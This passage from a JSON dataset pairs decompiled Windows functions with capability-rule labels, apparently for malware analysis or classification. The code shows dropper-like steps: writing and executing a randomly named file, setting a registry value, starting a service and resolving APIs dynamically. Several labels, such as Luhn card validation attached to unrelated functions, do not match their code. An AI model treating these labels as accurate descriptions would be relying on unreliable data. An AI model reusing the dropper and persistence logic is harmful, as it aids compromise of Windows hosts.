*puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004018e0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, str.M_2._B, acStack1304, &uStack2112);\n    uStack2088 = 0x4247c8;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4247e0;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004012b0(auStack1564, 0x42473c, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1871
    },
    "00403b80": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403b80(int32_t arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint unaff_EDI;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = fcn.004047d0(0, arg_8h, arg_ch + 1U >> 1, unaff_EDI);\n    iVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar1 = *(iVar3 + 0x58);\n    if (uVar2 < uVar1) {\n        arg_8h = (uVar2 - uVar1 & 0xffff) - 1;\n    }\n    else {\n        arg_8h = uVar2 - (uVar1 & 0xffff);\n    }\n    if (arg_8h < uVar1 >> 0x10) {\n        arg_8h = (arg_8h - (uVar1 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        arg_8h = arg_8h - (uVar1 >> 0x10);\n    }\n    *arg_14h = arg_8h + arg_ch;\n    *arg_10h = *(iVar3 + 0x58);\n    return;\n}\n",
        "token_count": 341
    },
    "004047d0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404852) overlaps instruction at (ram,0x00404851)\n// \n// WARNING: Removing unreachable block (ram,0x0040484f)\n\nulong __cdecl fcn.004047d0(uint16_t *arg_8h, uint16_t *arg_ch, uint16_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint16_t *puVar5;\n    int32_t in_EAX;\n    uint16_t *puVar6;\n    uint16_t *puVar7;\n    uint32_t in_ECX;\n    uint16_t *in_EDX;\n    uint16_t *unaff_EBX;\n    char *unaff_ESI;\n    int32_t unaff_EDI;\n    ushort in_SS;\n    bool in_PF;\n    bool in_SF;\n    bool bVar8;\n    \n    if ((in_SF) || (!in_SF)) {\n        if ((!in_PF) && (in_PF)) {\n            piVar1 = segment(in_SS, *0x10 + -0x10);\n            in_EAX = *piVar1;\n            in_EDX = arg_8h;\n            goto code_r0x004047dc;\n        }\ncode_r0x0040480d:\n        unaff_EBX = arg_10h;\n        puVar6 = arg_ch;\n        if (arg_10h == NULL) goto code_r0x00404867;\n    }\n    else {\ncode_r0x004047dc:\n        puVar6 = in_EAX + -0x1bf31dd6;\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        *unaff_ESI = *unaff_ESI + unaff_ESI;\n        unaff_ESI[0x66] = unaff_ESI[0x66] + in_EDX;\n        puVar7 = 0xf58ea42;\n        *0xf58ea42 = *0xf58ea42 + 'B';\n        puVar2 = unaff_EDI + 0x58;\n        uVar3 = *puVar2;\n        bVar8 = SCARRY1(*puVar2, -0x16);\n        *puVar2 = *puVar2 - 0x16;\n        arg_8h = 0xb7bc9ea5;\n        if (uVar3 < 0x16) {\n            if ((POPCOUNT(*puVar2) & 1U) == 0) {\n                piVar1 = unaff_EDI + 0x30;\n                *piVar1 = *piVar1 << 0xb;\n                iVar4 = *piVar1;\n                if (*piVar1 != 0) {\n                    return 0xb7bc9ea50f58ea42;\n                }\n                do {\n                    if ((bVar8 != iVar4 < 0) || (puVar5 = arg_8h,  bVar8 == iVar4 < 0)) {\n                        in_ECX = *puVar7;\n                        puVar5 = arg_8h & 0xffffff00 | *puVar6;\n                    }\n                    arg_8h = puVar7;\n                    if (in_ECX == puVar7) {\n                        in_ECX = unaff_EDI - 1;\n                        arg_8h = NULL;\n                        bVar8 = true;\n                        puVar7 = puVar5;\n                        do {\n                            puVar6 = puVar6 + 1;\n                            puVar7 = puVar7 + 1;\n                            if (in_ECX == 0) break;\n                            in_ECX = in_ECX - 1;\n                            bVar8 = *puVar7 == *puVar6;\n                        } while (bVar8);\n                        puVar6 = arg_10h;\n                        unaff_EDI = arg_14h;\n                        if (bVar8) goto code_r0x004047c9;\n                    }\n                    puVar7 = puVar5 + 1;\n                    bVar8 = SBORROW4(puVar7, unaff_EBX);\n                    iVar4 = puVar7 - unaff_EBX;\n                } while (puVar7 <= unaff_EBX);\n                puVar5 = NULL;\ncode_r0x004047c9:\n                return CONCAT44(arg_8h, puVar5);\n            }\n            goto code_r0x0040480d;\n        }\n    }\n    do {\n        arg_8h = arg_8h + *puVar6;\n        if (arg_8h >> 0x10 != 0) {\n            arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n        }\n        unaff_EBX = unaff_EBX + -1;\n        puVar6 = puVar6 + 1;\n    } while (unaff_EBX != NULL);\ncode_r0x00404867:\n    return CONCAT44(arg_8h, (arg_8h >> 0x10) + arg_8h);\n}\n",
        "token_count": 1127
    },
    "004046e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004046e0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.004040a0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "00404d50": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404e47) overlaps instruction at (ram,0x00404e43)\n// \n// WARNING: Removing unreachable block (ram,0x00404ddc)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00404d50(int32_t param_1, char *param_2)\n\n{\n    uint8_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint16_t uVar4;\n    char cVar6;\n    uint32_t in_EAX;\n    uint32_t uVar5;\n    int32_t iVar7;\n    uint *arg_20h;\n    uint unaff_EBX;\n    uchar *puVar8;\n    ushort uVar9;\n    uint *unaff_ESI;\n    uint *puVar10;\n    uint32_t *unaff_EDI;\n    uint *puVar11;\n    uint8_t uVar12;\n    bool bVar13;\n    uint8_t in_AF;\n    ulong uVar14;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000018;\n    uchar uVar15;\n    uchar uVar16;\n    uint uStack53;\n    uint8_t uStack49;\n    uchar uStack40;\n    uint32_t auStack39 [7];\n    int32_t iStack8;\n    \n    uStack49 = unaff_EDI >> 0x18;\n    uVar16 = in_EAX;\n    uStack53._0_1_ = in_EAX >> 0x18;\n    uStack53 = CONCAT31(unaff_EDI, uStack53);\n    uVar15 = param_2 >> 0x18;\n    uVar4 = (CONCAT11((in_EAX >> 8) + -0x2b, uVar16) ^ 0x3d) + 0x7c28 ^ CONCAT11(param_2 >> 8 | param_2, param_2);\n    uVar12 = uVar4 < 0x4001;\n    uVar4 = uVar4 + 0xbfff;\n    bVar13 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n    uVar5 = in_EAX & 0xffffff | uStack53 << 0x18;\n    if (uVar4 == 0) {\ncode_r0x00404d8e:\n        if (!bVar13) goto code_r0x00404d90;\ncode_r0x00404da5:\n        uVar15 = 7;\n        uVar16 = 0;\n        uVar9 = 0;\n        param_1 = in_stack_00000014;\n    }\n    else {\n        uVar16 = SUB41(unaff_EDI, 0);\n        uStack53 = CONCAT31(unaff_EDI, uStack49);\n        puVar2 = unaff_EDI & 0xffffff | uStack49 << 0x18;\n        unaff_EDI = puVar2;\n        if (uVar4 != 0) goto code_r0x00404d8e;\n        unaff_EDI = puVar2 + 1;\n        uVar3 = in(param_2);\n        *puVar2 = uVar3;\n        if (&uStack53 + 1 < 1) {\n            puVar8 = &stack0xfffffffd;\n            goto code_r0x00404dfb;\n        }\n        uVar5 = uVar5 ^ 0xdee0ed6d;\n        uVar5 = uVar5 & 0xffff0000 | uVar5 + (uVar5 >> 8) * -0x31;\n        puVar1 = param_2 + 0x15;\n        uVar12 = false;\n        *puVar1 = *puVar1 ^ unaff_EBX >> 8;\n        bVar13 = (POPCOUNT(*puVar1) & 1U) == 0;\ncode_r0x00404d90:\n        uVar9 = SUB42(unaff_ESI, 0);\n        if (!bVar13) goto code_r0x00404da5;\n        out(*unaff_ESI, param_2);\n        in_stack_00000018 = uVar5;\n        uVar12 = in_AF;\n        do {\n            cVar6 = in_stack_00000018 >> 8;\n            uVar12 = 9 < (in_stack_00000018 & 0xf) | uVar12;\n            in_stack_00000018 = CONCAT31(CONCAT21(in_stack_00000018 >> 0x10, cVar6 - uVar12), -uVar12);\n        } while (uVar12 || cVar6 == *param_2);\n    }\n    puVar2 = unaff_EDI + param_2 * 2;\n    bVar13 = *puVar2 < 0xffffff85 || *puVar2 + 0x7b < uVar12;\n    *puVar2 = (*puVar2 + 0x7b) - uVar12;\n    *(param_1 + -0x75) = in_stack_00000018;\n    uVar12 = in_stack_00000018 + 0x75;\n    puVar8 = &stack0xfffffffc;\n    param_2[7] = (param_2[7] - (param_1 >> 8)) - (in_stack_00000018 < 0x8b || uVar12 < bVar13);\n    iStack8 = fcn.00404740(param_1, in_stack_00000018 & 0xffffff00 | uVar12 - bVar13, 0x4244b0, \n                           CONCAT22(uVar9, CONCAT11(uVar16, uVar15)));\n    if (iStack8 == 0) {\n        return 0;\n    }\n    param_1 = 7;\n    uVar5 = 0;\n    unaff_EDI = &uStack40 + 1;\ncode_r0x00404dfb:\n    for (; param_1 != 0; param_1 = param_1 + -1) {\n        *unaff_EDI = uVar5;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    *unaff_EDI = uVar5;\n    *(unaff_EDI + 2) = uVar5;\n    puVar10 = NULL;\n    do {\n        uVar14 = (*_sym.imp.MSVCRT.dll_rand)();\n        arg_20h = uVar14 >> 0x20;\n        (puVar8 + -0x24)[puVar10] = uVar14;\n        puVar10 = puVar10 + 1;\n    } while (puVar10 < 0x20);\n    if ((puVar10 < 0x21) || (0x20 < puVar10)) {\n        arg_20h = *(puVar8 + -4);\n    }\n    else {\n        *(unaff_EDI + 3) = *puVar10;\n        puVar8 = 0x8be181d0;\n        uStack53 = 0x8be181d0;\n    }\n    puVar10 = puVar8 + -0x24;\n    puVar11 = arg_20h;\n    for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar11 = *puVar10;\n        puVar10 = puVar10 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    fcn.00404530(*(puVar8 + 8), *(puVar8 + 0xc), *(puVar8 + 0x10), *(puVar8 + 0x14), puVar8 + -0x24, 0x20, arg_20h);\n    fcn.00401550(*(puVar8 + 0x18), *(puVar8 + 0x1c));\n    return 1;\n}\n",
        "token_count": 1758
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.004046e0(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00401000(argv),  pcVar3 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar3)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 241
    },
    "00401550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040158a) overlaps instruction at (ram,0x00401586)\n// \n// WARNING: Removing unreachable block (ram,0x004015a2)\n\nuint __cdecl fcn.00401550(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    int32_t *piVar2;\n    unkbyte10 extraout_ST0;\n    ulong uVar3;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    uVar3 = fcn.00403b80(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    piVar2 = uVar3 >> 0x20;\n    iVar1 = uVar3;\n    if (iVar1 != 0) {\n        if ((iVar1 < 0) || (iVar1 >= 0)) {\n            *(iVar1 + 0x58) = arg_ch;\n        }\n        else {\n            *(iVar1 + -0x7ce92414) = extraout_ST0;\n            *piVar2 = *piVar2 + 0x558bdf84;\n        }\n        fcn.00403b80(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 318
    },
    "004018e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004018e0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00401b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401baa) overlaps instruction at (ram,0x00401ba7)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00401b70(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    bool bVar3;\n    unkbyte6 Var4;\n    uint var_4h;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    while( true ) {\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        Var4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x424570);\n        *0x4248fc = Var4;\n        bVar3 = ((CONCAT11((Var4 >> 8) + -0x2b, Var4) ^ 0x3d) + 0x7c28 ^\n                (Var4 >> 0x20 & 0xff | (Var4 >> 0x28 | Var4 >> 0x20) << 8)) < 0x4001;\n        *0x424900 = (*pcVar1)(iVar2, 0x42458c);\n        if (bVar3) break;\n        if (!bVar3) break;\n        if (&stack0xffffffec < **0x424900 || *0x424900 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(iVar2 + -1) = *(iVar2 + -1) + extraout_DL + '\\x01';\n    }\n    *0x424904 = (*pcVar1)(iVar2);\n    if (((*0x4248fc != 0) && (*0x424900 != NULL)) && (*0x424904 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 454
    },
    "004025a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040279c) overlaps instruction at (ram,0x0040279a)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.004025a0(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    char **ppcVar3;\n    uint32_t uVar4;\n    char cVar5;\n    uint8_t uVar6;\n    uint16_t uVar7;\n    uint uVar8;\n    char *pcVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint8_t extraout_DL;\n    int32_t extraout_EDX;\n    uint *unaff_EBX;\n    int32_t unaff_EDI;\n    uint8_t *puVar12;\n    ushort in_SS;\n    uint8_t uVar13;\n    uchar uVar14;\n    bool bVar15;\n    uint8_t uVar16;\n    uint8_t in_AF;\n    uint8_t uVar17;\n    uchar uVar18;\n    bool bVar19;\n    bool in_SF;\n    uint8_t uVar20;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t uVar21;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ushort uVar22;\n    ushort in_stack_ffffffe8;\n    uchar in_stack_ffffffea;\n    uchar in_stack_ffffffeb;\n    uchar in_stack_ffffffec;\n    uchar in_stack_ffffffed;\n    ushort in_stack_ffffffee;\n    ushort in_stack_fffffff0;\n    ushort in_stack_fffffff2;\n    uint16_t uVar23;\n    \n    if ((in_SF) || (!in_SF)) {\n        in_stack_fffffff0 = 0x20;\n        in_stack_fffffff2 = 0;\n        in_stack_ffffffec = 0xe8;\n        in_stack_ffffffed = 0x47;\n        in_stack_ffffffee = 0x42;\n        in_stack_ffffffe8 = 0x18;\n        in_stack_ffffffea = 0;\n        in_stack_ffffffeb = 0;\n    }\n    puVar12 = unaff_EDI + 1;\n    *(param_2 + 0x19) = *(param_2 + 0x19) + (param_1 >> 8);\n    fcn.004017d0(0x424454, CONCAT13(in_stack_ffffffeb, CONCAT12(in_stack_ffffffea, in_stack_ffffffe8)), \n                 CONCAT22(in_stack_ffffffee, CONCAT11(in_stack_ffffffed, in_stack_ffffffec)), \n                 CONCAT22(in_stack_fffffff2, in_stack_fffffff0));\n    fcn.004017d0(0x424454, 0x18, 0x424808, 0x26);\n    fcn.004017d0(0x424454, 0x18, 0x424830, 8);\n    uVar22 = 0x4454;\n    uVar14 = 0x42;\n    uVar18 = 0;\n    fcn.004017d0(0x424454, 0x18, 0x424838, 0x19);\ncode_r0x0040263e:\n    fcn.004017d0(0x424454, 0x18, 0x424854, CONCAT13(uVar18, CONCAT12(uVar14, uVar22)));\n    uVar7 = fcn.004017d0(0x424454, 0x18, 0x424860, 0x12);\n    uVar13 = 0;\n    uVar21 = 0;\n    uVar20 = 0;\n    uVar17 = (uVar7 & 0x1e59) == 0;\n    uVar16 = (POPCOUNT(uVar7 & 0x59) & 1U) == 0;\n    uVar8 = fcn.004017d0(0x424454, 0x18, 0x424874, 0x12);\n    if (uVar16) goto code_r0x004026b9;\n    uVar22 = uVar8;\n    uVar14 = uVar8 >> 0x10;\n    uVar18 = uVar8 >> 0x18;\n    if (!uVar16) goto code_r0x004026b9;\n    do {\n        ppcVar3 = segment(in_SS, *0x10 + -0x18);\n        pcVar9 = *ppcVar3;\n        if (uVar13) {\n            *unaff_EBX = *unaff_EBX;\n            *pcVar9 = *pcVar9 + pcVar9;\ncode_r0x004026df:\n            out(0xbd, pcVar9);\n            return;\n        }\n        if (uVar16) goto code_r0x0040263e;\n        uVar13 = 0;\n        uVar21 = 0;\n        uVar20 = &stack0xffffffec < 0;\n        uVar17 = *0x10 == 0x14;\n        uVar16 = (POPCOUNT(&stack0xffffffec & 0xff) & 1U) == 0;\ncode_r0x004026b9:\n        uVar22 = 2;\n        uVar14 = 0;\n        uVar18 = 0;\n        pcVar9 = fcn.004017d0(0x424454, 0x18, 0x424888, 2);\n        if ((!uVar13) && (uVar13)) goto code_r0x004026df;\n        fcn.004017d0(0x424454, 0x18, 0x42488c, 8);\n        if ((uVar16) || (!uVar16)) goto code_r0x00402721;\n        segment(in_SS, *0x10 + -0x38);\n        if (uVar13) goto code_r0x00402742;\n        if (!uVar16) {\ncode_r0x00402721:\n            uVar6 = fcn.004017d0(0x424454, 0x18, 0x424894, 8);\n            uVar13 = 0xffffffbf < &stack0xffffffb8;\n            uVar21 = SCARRY4(&stack0xffffffb8, 0x40);\n            uVar20 = &stack0xfffffff8 < 0;\n            uVar17 = *0x10 == 0x8;\n            uVar16 = (POPCOUNT(&stack0xfffffff8 & 0xff) & 1U) == 0;\n            if ((!uVar13) && (uVar13)) {\n                uVar13 = uVar6 < *puVar12;\n                uVar21 = SBORROW1(uVar6, *puVar12);\n                cVar5 = uVar6 - *puVar12;\n                uVar20 = cVar5 < '\\0';\n                uVar17 = cVar5 == '\\0';\n                uVar16 = (POPCOUNT(cVar5) & 1U) == 0;\n                puVar12 = unaff_EDI + 2;\n            }\ncode_r0x00402742:\n            uVar7 = (in_NT & 1) * 0x4000 | (uVar21 & 1) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                    (uVar20 & 1) * 0x80 | (uVar17 & 1) * 0x40 | (in_AF & 1) * 0x10 | (uVar16 & 1) * 4 | uVar13 & 1;\n            uVar23 = (in_ID & 1) * 0x20 | (in_VIP & 1) * 0x10 | (in_VIF & 1) * 8 | (in_AC & 1) * 4;\n            iVar10 = func_0x101886c1();\n            uVar14 = false;\n            uVar18 = (*(iVar10 + -0x7f + unaff_EBX) & 0x4b) == 0;\n            fcn.004017d0(0x424454, 0x18, 0x42489c, CONCAT22(uVar23, uVar7));\n            if ((!uVar14) && (uVar14)) {\n                puVar2 = unaff_EBX + extraout_EDX * 4 + 0x69;\n                uVar11 = uVar14;\n                uVar4 = unaff_EBX + *puVar2;\n                uVar14 = CARRY4(unaff_EBX, *puVar2) || CARRY4(uVar4, uVar11);\n                unaff_EBX = uVar4 + uVar11;\n                uVar18 = unaff_EBX == NULL;\n            }\n            uVar8 = 0x18;\n            fcn.004017d0(0x424454, 0x18, 0x4248a4, 7);\n            if ((!uVar14 && !uVar18) && (uVar14 || uVar18)) {\n                *(puVar12 + 0x6a) = *(puVar12 + 0x6a) - &stack0xffffffd4;\n            }\n            fcn.004017d0(0x424454, 0x18, str._a6_nb_, uVar8);\n            fcn.004017d0(0x424454, 0x18, 0x4248b4, 6);\n            bVar15 = false;\n            bVar19 = (extraout_DL & 0x66) == 0;\n            uVar11 = fcn.004017d0(0x424454, 0x18, 0x4248bc, 0x25);\n            if ((!bVar19) && (bVar19)) {\n                if (bVar15 || unaff_EBX + 1 == 0) {\n                    (*_sym.imp.MSVCRT.dll_time)();\n                    (*_sym.imp.MSVCRT.dll_srand)();\n                    *0x424908 = 1;\n                    return;\n                }\n                in_AF = 9 < (uVar11 & 0xf) | in_AF;\n                piVar1 = (uVar11 & 0xffff0000 | CONCAT11((uVar11 >> 8) + in_AF, uVar11 + in_AF * '\\x06') & 0xff0f) +\n                         0x2a;\n                *piVar1 = *piVar1 - (unaff_EBX + 1);\n            }\n            fcn.004017d0(0x424454, 0x18, 0x4248e4, 8);\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 2447
    },
    "00402880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402908)\n\nbool fcn.00402880(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00404150(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x424634, 0x424674, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 259
    },
    "00402940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402940(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 241
    },
    "004029e0": {
        "rules": [
